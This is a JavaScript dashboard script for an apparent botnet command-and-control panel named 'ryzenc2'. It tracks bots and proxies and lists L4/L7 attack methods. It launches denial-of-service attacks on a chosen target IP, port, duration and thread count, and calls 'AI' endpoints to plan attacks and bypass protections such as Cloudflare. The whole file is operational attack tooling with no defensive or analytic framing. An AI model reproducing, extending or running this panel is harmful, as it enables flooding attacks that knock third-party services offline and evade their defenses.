(function () {
  var $ = function (s) { return document.querySelector(s); };
  var apiBase = "";
  function key() { return ($("#apiKey") && $("#apiKey").value) || "ryzenc2_api_key_change_me"; }
  async function api(path, opts) {
    opts = opts || {};
    var r = await fetch(apiBase + path, {
      method: opts.method || "GET",
      headers: { "Content-Type": "application/json", "X-API-Key": key() },
      body: opts.body || undefined
    });
    return r.json();
  }
  function fmtTime(ts) {
    if (!ts) return "—";
    try { return new Date(ts * 1000).toLocaleString(); } catch (e) { return String(ts); }
  }
  function fillTable(tableId, rowsHtml) {
    var tb = document.querySelector("#" + tableId + " tbody");
    if (tb) tb.innerHTML = rowsHtml || '<tr><td colspan="6">Empty</td></tr>';
  }

  async function refresh() {
    try {
      var st = await api("/api/v1/stats");
      $("#apiStatus").textContent = "online";
      var dot = $("#connDot"); if (dot) dot.classList.add("online");
      var b = st.bots || {}, p = st.proxies || {}, a = st.attacks || {};
      $("#statBots").textContent = (b.online || 0) + "/" + (b.total || 0);
      $("#statProxies").textContent = (p.alive || 0) + "/" + (p.total || 0);
      $("#statAttacks").textContent = a.running || 0;
      $("#healthBox").textContent = JSON.stringify(st, null, 2);
      if (window.RyzenCharts) RyzenCharts.push(b.online || 0, p.alive || 0);
    } catch (e) {
      $("#apiStatus").textContent = "offline";
      var dot = $("#connDot"); if (dot) dot.classList.remove("online");
      $("#healthBox").textContent = "API offline — chạy app.py menu 11";
    }
    try {
      var m = await api("/api/v1/methods");
      $("#statMethods").textContent = m.total || "—";
      var l4 = m.L4 || [], l7 = m.L7 || [];
      var q = ($("#methodSearch") && $("#methodSearch").value || "").toUpperCase();
      $("#l4List").innerHTML = l4.filter(function (x) { return !q || x.indexOf(q) >= 0; }).map(function (x) { return '<span class="tag">' + x + "</span>"; }).join("");
      $("#l7List").innerHTML = l7.filter(function (x) { return !q || x.indexOf(q) >= 0; }).map(function (x) { return '<span class="tag">' + x + "</span>"; }).join("");
      var dl = $("#methodList");
      if (dl && !dl.children.length) {
        l4.concat(l7).slice(0, 100).forEach(function (x) {
          var o = document.createElement("option"); o.value = x; dl.appendChild(o);
        });
      }
    } catch (e) {}
    try {
      var bots = await api("/api/v1/bots");
      var list = bots.bots || [];
      var fq = ($("#botSearch") && $("#botSearch").value || "").toLowerCase();
      list = list.filter(function (b) {
        var s = ((b.uuid || "") + (b.os || "") + (b.status || "")).toLowerCase();
        return !fq || s.indexOf(fq) >= 0;
      });
      fillTable("botsTable", list.slice(0, 100).map(function (b) {
        var st = (b.status || "unknown");
        var badge = st === "online" ? "on" : "off";
        return "<tr><td>" + (b.uuid || "").slice(0, 12) + "</td><td>" + (b.os || "") + "</td><td>" + (b.arch || "") +
          '</td><td><span class="badge ' + badge + '">' + st + "</span></td><td>" + fmtTime(b.last_seen) + "</td></tr>";
      }).join(""));
    } catch (e) {}
    try {
      var atk = await api("/api/v1/attacks");
      var al = atk.attacks || [];
      var aq = ($("#atkSearch") && $("#atkSearch").value || "").toLowerCase();
      al = al.filter(function (a) {
        var s = ((a.method || "") + (a.target_ip || "") + (a.status || "")).toLowerCase();
        return !aq || s.indexOf(aq) >= 0;
      });
      fillTable("atkTable", al.slice(0, 100).map(function (a) {
        var st = a.status || "";
        var badge = st === "running" ? "run" : (st === "completed" ? "on" : "off");
        return "<tr><td>" + a.id + "</td><td>" + (a.method || "") + "</td><td>" + (a.target_ip || "") + ":" + (a.target_port || "") +
          '</td><td><span class="badge ' + badge + '">' + st + "</span></td><td>" + (a.pps || 0) +
          '</td><td><button class="btn sm" data-stop="' + a.id + '">Stop</button></td></tr>';
      }).join(""));
      document.querySelectorAll("[data-stop]").forEach(function (btn) {
        btn.onclick = async function () {
          await api("/api/v1/attacks/" + btn.getAttribute("data-stop") + "/stop", { method: "POST", body: "{}" });
          toast("Stop sent");
          refresh();
        };
      });
    } catch (e) {}
    try {
      var px = await api("/api/v1/proxies");
      var pl = px.proxies || [];
      var pq = ($("#proxySearch") && $("#proxySearch").value || "").toLowerCase();
      pl = pl.filter(function (p) {
        var s = ((p.address || "") + (p.protocol || "") + String(p.port || "")).toLowerCase();
        return !pq || s.indexOf(pq) >= 0;
      });
      fillTable("proxyTable", pl.slice(0, 100).map(function (p) {
        var alive = p.alive || p.status === "alive";
        return "<tr><td>" + (p.address || "") + "</td><td>" + (p.port || "") + "</td><td>" + (p.protocol || p.type || "") +
          '</td><td><span class="badge ' + (alive ? "on" : "off") + '">' + (alive ? "alive" : "dead") + "</span></td><td>" +
          (p.latency || 0) + "ms</td><td>" + (p.score || 0) + "</td></tr>";
      }).join(""));
    } catch (e) {}
  }
  window.ryzenRefresh = refresh;

  document.querySelectorAll(".nav-item").forEach(function (el) {
    el.addEventListener("click", function (e) {
      e.preventDefault();
      document.querySelectorAll(".nav-item").forEach(function (n) { n.classList.remove("active"); });
      document.querySelectorAll(".page").forEach(function (p) { p.classList.remove("active"); });
      el.classList.add("active");
      var page = el.getAttribute("data-page");
      var sec = document.getElementById("page-" + page);
      if (sec) sec.classList.add("active");
      $("#pageTitle").textContent = el.textContent.replace(/^[^\s]+\s/, "");
    });
  });

  $("#btnRefresh") && $("#btnRefresh").addEventListener("click", refresh);
  $("#btnTheme") && $("#btnTheme").addEventListener("click", function () {
    document.body.classList.toggle("theme-light");
    toast(document.body.classList.contains("theme-light") ? "Light theme" : "Dark theme");
  });
  $("#btnSimBots") && $("#btnSimBots").addEventListener("click", async function () {
    await api("/api/v1/bots/simulate", { method: "POST", body: JSON.stringify({ count: 50 }) });
    toast("Bots +50"); refresh();
  });
  $("#btnScrape") && $("#btnScrape").addEventListener("click", async function () {
    toast("Scraping…");
    await api("/api/v1/proxies/scrape", { method: "POST", body: "{}" });
    toast("Scrape done"); refresh();
  });
  $("#btnCheck") && $("#btnCheck").addEventListener("click", async function () {
    toast("Checking…");
    await api("/api/v1/proxies/check-all", { method: "POST", body: "{}" });
    toast("Check done"); refresh();
  });
  $("#btnRmDead") && $("#btnRmDead").addEventListener("click", async function () {
    await api("/api/v1/proxies/remove-dead", { method: "POST", body: "{}" });
    toast("Dead removed"); refresh();
  });
  $("#btnLaunch") && $("#btnLaunch").addEventListener("click", async function () {
    var body = {
      method: $("#atkMethod").value, target_ip: $("#atkTarget").value,
      target_port: +$("#atkPort").value, duration: +$("#atkDur").value,
      threads: +$("#atkThr").value, auto_start: true
    };
    await api("/api/v1/attacks", { method: "POST", body: JSON.stringify(body) });
    toast("Attack launched"); refresh();
  });
  $("#btnAnalyze") && $("#btnAnalyze").addEventListener("click", async function () {
    $("#aiBox").textContent = JSON.stringify(await api("/api/v1/ai/analyze", { method: "POST", body: JSON.stringify({ target: $("#aiTarget").value }) }), null, 2);
  });
  $("#btnPlan") && $("#btnPlan").addEventListener("click", async function () {
    $("#aiBox").textContent = JSON.stringify(await api("/api/v1/ai/plan", { method: "POST", body: JSON.stringify({ target: $("#aiTarget").value }) }), null, 2);
  });
  $("#btnBypass") && $("#btnBypass").addEventListener("click", async function () {
    $("#aiBox").textContent = JSON.stringify(await api("/api/v1/ai/bypass", { method: "POST", body: JSON.stringify({ type: $("#aiTarget").value || "cloudflare" }) }), null, 2);
  });
  ["botSearch", "atkSearch", "proxySearch", "methodSearch"].forEach(function (id) {
    var el = document.getElementById(id);
    if (el) el.addEventListener("input", function () { refresh(); });
  });

  refresh();
  setInterval(refresh, 12000);
})();
